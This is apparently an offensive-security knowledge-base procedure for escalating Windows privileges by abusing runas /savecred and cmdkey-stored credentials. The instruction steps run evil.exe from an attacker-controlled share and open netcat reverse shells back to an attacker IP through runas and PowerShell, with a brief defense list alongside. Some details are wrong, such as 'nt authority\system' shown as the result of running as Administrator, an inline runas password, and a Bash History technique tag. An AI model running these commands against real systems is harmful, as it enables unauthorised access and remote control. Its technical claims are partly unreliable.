---
id: 86e202cf-5ad3-4d5f-96ca-ba31d1a31506
name: Windows Privilege Escalation via Runas
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:29.963367+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - >-
    [[techniques/Abuse Elevation Control Mechanism|T1548 - Abuse Elevation
    Control Mechanism]]
  - '[[techniques/Unsecured Credentials|T1552 - Unsecured Credentials]]'
sub_techniques:
  - '[[techniques/Unsecured Credentials.003|T1552.003 - Bash History]]'
tags:
  - '[[tags/EoP - Runas]]'
  - '[[tags/Windows - Privilege Escalation]]'
  - runas
  - cmdkey
  - credential-abuse
commands:
  - '[[commands/cmdkey-list-stored-credentials]]'
  - '[[commands/cmdkey-add-credential]]'
  - '[[commands/cmdkey-delete-credential]]'
  - '[[commands/runas-execute-as-user]]'
  - '[[commands/runas-execute-as-user-with-savecred]]'
platforms:
  - Windows
tools: []
validated: true
---

# Windows Privilege Escalation via Runas

## Summary

This procedure demonstrates how to escalate privileges on a Windows system using the built-in `runas` command combined with `cmdkey` for credential management. By storing administrative credentials with `/savecred`, an attacker can execute commands or payloads as a privileged user without repeated password prompts, enabling persistence and further post-exploitation activities like launching reverse shells.

## Description

The `runas` utility allows running programs as a different user, and the `/savecred` option stores the provided credentials in the Windows Credential Manager for reuse. This technique is useful after obtaining initial low-privilege access and admin credentials (e.g., via phishing or keylogging). Once stored, credentials can be listed or deleted with `cmdkey`. This method bypasses some UAC prompts and is effective in domain or local admin escalation scenarios. It targets Windows Credential Manager, which stores creds in an unsecured manner if not protected by additional controls. Potential outcomes include executing arbitrary code as SYSTEM or Administrator, data exfiltration, or lateral movement.

## Requirements

1. Low-privilege shell access on a Windows target (e.g., via initial access vector like RDP or phishing).
2. Knowledge of an administrative username and password (obtained separately, e.g., via credential dumping).
3. Command prompt or PowerShell access on the target.
4. For remote execution examples, an attacker-controlled listener (e.g., netcat) and network connectivity.

## Defense

- Limit user privileges to least required; avoid local admin rights for standard users.
- Monitor Credential Manager access via Event ID 4657 (Security) for suspicious additions/deletions.
- Enable LSA protection and restrict `runas` usage through AppLocker or GPO.
- Implement MFA for admin accounts and audit `cmdkey` and `runas` executions in command-line auditing.
- Use tools like Sysmon to log process creation with parent-child relationships involving `runas.exe`.

## Objectives

1. Store administrative credentials for reuse without prompting.
2. Execute payloads or commands as a privileged user to escalate access.
3. Verify escalation by checking effective user context (e.g., via `whoami`).
4. Establish persistence or a reverse shell for further operations.

## Instructions

### Step 1: List Currently Stored Credentials

**Context**: Before adding new credentials, enumerate existing ones in the Credential Manager to avoid conflicts or identify reusable creds. This helps understand the target's stored authentication data.

**Command** ([[commands/cmdkey-list-stored-credentials]]):
```cmd
cmdkey /list
```

> This displays all stored credentials, including targets, users, and types. Look for domain or local admin entries.

**Expected Output**:
```
Currently stored credentials ...

  Target: Domain:target=localhost
    Type: Domain Password
    User: Administrator
```

### Step 2: Add a New Credential (Optional, if not using /savecred)

**Context**: Manually add a credential for a specific target (e.g., a remote server) using `cmdkey`. This is useful for network resources but can be skipped if using `runas /savecred`, which handles storage automatically on first use.

**Command** ([[commands/cmdkey-add-credential]]):
```cmd
cmdkey /add:$_TARGET /user:$_USERNAME /pass:$_PASSWORD
```

> Replace placeholders with actual values (e.g., /add:TERMSRV/remotehost /user:Administrator /pass:Pass123). This stores the cred for future `runas` invocations.

**Expected Output**:
```
Credential added successfully.
```

If a credential exists, delete it first with Step 3.

### Step 3: Delete an Existing Credential (If Needed)

**Context**: Remove conflicting or old credentials to ensure clean storage. This prevents errors during addition or reuse.

**Command** ([[commands/cmdkey-delete-credential]]):
```cmd
cmdkey /delete:$_TARGET
```

> Specify the exact target name from the list output (e.g., /delete:TERMSRV/targethost).

**Expected Output**:
```
Deleted the stored credential for target ...
```

### Step 4: Execute a Command as a Different User with Credential Save

**Context**: Use `runas` with `/savecred` to run a program as admin. On first execution, enter the password; it will be stored for subsequent runs without prompting. This escalates to run simple commands like `whoami` or payloads.

**Command** ([[commands/runas-execute-as-user-with-savecred]]):
```cmd
runas /savecred /user:$_USERNAME "$_PROGRAM"
```

> Example: runas /savecred /user:Administrator "cmd.exe /k whoami". The new window runs as the specified user.

**Expected Output** (in new cmd window):
```
whoami
nt authority\system
```

For payload execution, use the following code to run a remote executable:

**Code** ([[codes/runas-savecred-execute-evil-exe-and-whoami]]):
```cmd
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
runas /savecred /user:Administrator "cmd.exe /k whoami"
```

> This executes `evil.exe` from a share and verifies the user context. Replace IP with attacker's share host.

### Step 5: Launch a Reverse Shell via Runas

**Context**: Escalate by running `nc.exe` (netcat) as admin to connect back to the attacker. Assumes `nc.exe` is staged on the target (e.g., in C:\users\Public).

**Command** ([[commands/runas-execute-as-user]]):
```cmd
runas /user:$_USERNAME "$_PROGRAM"
```

> Basic syntax for non-savecred runs, but combine with stored creds.

For direct reverse shell with password prompt:

**Code** ([[codes/runas-launch-nc-reverse-shell]]):
```cmd
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

> Prompts for password inline; executes netcat to connect back on port 4444.

For remote execution using PowerShell (if targeting another host):

**Code** ([[codes/powershell-start-nc-with-remote-creds]]):
```powershell
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

> This starts `nc.exe` on a remote computer with provided creds, establishing a reverse shell.
